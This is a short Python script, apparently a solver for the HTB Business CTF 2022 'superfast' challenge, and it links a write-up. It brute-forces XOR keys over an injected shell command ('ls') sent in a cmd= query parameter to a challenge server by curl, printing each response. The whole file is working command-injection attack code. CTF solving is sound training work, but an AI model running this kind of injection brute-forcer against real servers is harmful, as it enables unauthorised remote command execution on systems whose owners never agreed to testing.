#https://fascinating-confusion.io/posts/2022/07/htb-business-ctf-22-superfast-writeup/

from pwn import *

URL = "http://188.166.175.58:32212/index.php?cmd="
cmd = 'ls'

def execute_curl(url):
    try:
        # Run the cURL command and capture its output
        result = subprocess.run(['curl', url], capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print("Error executing cURL")
        return None

# Example URL

# Call the function with the URL and print the output
for i in range(1, 256):
    xor_result =  xor(cmd, i)  
    final_url = URL + xor_result
    print("Sending request to:" + final_url)

    output = execute_curl(final_url)
    if output:
        print("cURL output:\n"+output)

   
